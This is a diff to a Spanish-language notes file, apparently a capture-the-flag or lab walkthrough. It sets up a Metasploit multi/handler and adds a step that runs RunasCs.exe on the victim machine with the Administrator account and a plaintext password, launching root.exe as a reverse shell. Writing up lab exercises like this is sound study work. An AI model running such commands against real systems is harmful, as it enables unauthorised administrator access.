@@ -140,13 +140,16 @@ creamos un payload que nos permita conectarnos a la maquina y con un servidor en
 ![[Pasted image 20240514212432.png]]
 
 ### /multi/handler
-vamos a setear el multi
+vamos a setear el multi/handler
 ![[Pasted image 20240514212756.png]]
 
+en la maquina victima podemos correr el comando de runas para invocar una reverse shellcon las credenciales de administrador
+```python
+.\RunasCs.exe Administrator ThisPasswordShouldDo!@ root.exe
+```
 ![[Pasted image 20240514214404.png]]
 
 
 ![[Pasted image 20240514214353.png]]
 
 ![[Pasted image 20240514214337.png]]
-.\RunasCs.exe Administrator ThisPasswordShouldDo!@ root.exe
